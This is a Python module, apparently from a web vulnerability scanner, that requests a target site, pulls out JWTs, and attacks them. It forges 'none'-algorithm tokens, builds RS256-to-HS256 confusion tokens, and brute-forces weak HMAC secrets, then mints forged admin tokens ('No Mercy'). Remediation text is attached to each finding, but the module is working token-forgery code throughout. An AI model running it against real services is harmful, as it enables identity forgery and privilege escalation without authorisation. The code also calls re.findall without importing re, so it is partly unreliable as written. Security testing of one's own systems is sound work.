import aiohttp
import asyncio
import jwt
import json

# Top Secrets ที่ Dev ชอบเผลอใช้
WEAK_SECRETS = [
    "secret", "supersecret", "key", "123456", "password", 
    "jwt", "admin", "test", "12345", "1234567890", 
    "api", "apikey", "application", "app"
]

async def crack_and_forge(token, public_key=None):
    findings = []
    
    try:
        # 1. Decode Header & Payload (without verify)
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})
        
        # --- Attack 1: None Algorithm ---
        try:
            none_token = jwt.encode(payload, None, algorithm="none")
            findings.append({
                "type": "JWT None Algorithm Vulnerability",
                "severity": "High",
                "detail": "Token allows 'none' algorithm. Identity forgery possible.",
                "evidence": f"Forged Token (Unsigned):\n{none_token}",
                "remediation": "Reject tokens with 'none' algorithm or empty signatures."
            })
        except Exception: pass

        # --- Attack 2: Header Parameter Injection (jku/x5u/kid) ---
        dangerous_headers = ["jku", "x5u", "jwk"]
        found_headers = [h for h in dangerous_headers if h in header]
        
        if found_headers:
            findings.append({
                "type": "JWT Header Injection (Potential)",
                "severity": "Medium",
                "detail": f"Token header contains dangerous parameters: {', '.join(found_headers)}.",
                "evidence": f"Header: {json.dumps(header, indent=2)}",
                "remediation": "Whitelist allowed 'kid' values and disable 'jku'/'x5u' unless strictly necessary."
            })

        # --- Attack 3: Algorithm Confusion (RS256 -> HS256) ---
        # Requirement: Original Alg is Asymmetric (e.g. RS256) AND we have the Public Key
        if header.get('alg', '').startswith('RS') and public_key:
            try:
                # Force HS256 using Public Key as Secret
                # If server verifies this, it means they used the public key key strings as the HMAC secret
                forged_payload = payload.copy()
                forged_payload['role'] = 'admin' # Try to elevate
                
                # Trick: Encrypt with HS256 using the Public Key String as the Secret
                confusion_token = jwt.encode(forged_payload, public_key, algorithm="HS256")
                
                findings.append({
                    "type": "JWT Algorithm Confusion (RS256 -> HS256)",
                    "severity": "Critical",
                    "detail": "Server might accept HMAC tokens signed with its own Public Key.",
                    "evidence": f"Public Key used as Secret.\nForged Token:\n{confusion_token}",
                    "remediation": "Enforce algorithm verification (strictly RS256)."
                })
            except Exception: pass

        # --- Attack 4: Brute Force Secret (HS256) ---
        # Only relevant if using Symmetric keys or if we want to try generic secrets anyway
        if header.get('alg', '').startswith('HS'):
            cracked_secret = None
            for secret in WEAK_SECRETS:
                try:
                    jwt.decode(token, secret, algorithms=['HS256'])
                    cracked_secret = secret
                    break
                except jwt.InvalidSignatureError:
                    continue
                except Exception: pass
            
            if cracked_secret:
                # [NO MERCY] Forge Admin Token
                for key in ['role', 'scope', 'permissions', 'admin', 'is_admin']:
                    if key in payload:
                        payload[key] = 'admin'
                if 'user' in payload: payload['user'] = 'admin'
                if 'sub' in payload: payload['sub'] = 'admin'
                
                forged_token = jwt.encode(payload, cracked_secret, algorithm='HS256')
                
                findings.append({
                    "type": "JWT Weak Secret (Identity Theft)",
                    "severity": "Critical",
                    "detail": f"Secret key cracked: '{cracked_secret}'. FORGED ADMIN TOKEN GENERATED.",
                    "evidence": f"Original Secret: {cracked_secret}\n\n[IMPACT PROOF - FORGED ADMIN TOKEN]\n{forged_token}",
                    "remediation": "Change JWT secret to a strong random string."
                })

    except Exception as e:
        pass
        
    return findings

async def run_jwt_scan(target_url, log_callback=None, headers=None):
    findings = []
    
    # พยายามหา JWT จากการ Request หน้าเว็บ (Header/Cookie/Body)
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(target_url, timeout=5, ssl=False) as resp:
                text = await resp.text()
                headers_str = str(resp.headers)
                cookies_str = str(resp.cookies)
                
                # Regex สำหรับ JWT (3 ส่วน คั่นด้วยจุด)
                jwt_pattern = r'(eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)'
                
                tokens = set(re.findall(jwt_pattern, text + headers_str + cookies_str))
                
                # [TODO] Extract Real Public Key from /.well-known/jwks.json if possible
                # For now, we will assume None or user supplied.
                # In full enterprise version, we would fetch JWKS.
                mock_public_key = None 
                
                if tokens:
                    if log_callback: log_callback(f"🔑 Found {len(tokens)} JWT(s). Attempting to crack & forge (No Mercy)...")
                    for token in tokens:
                        res = await crack_and_forge(token, public_key=mock_public_key)
                        findings.extend(res)
                        if res and log_callback: log_callback("🔥 JWT Vulnerability Found!")
    except Exception:
        pass
        
    return findings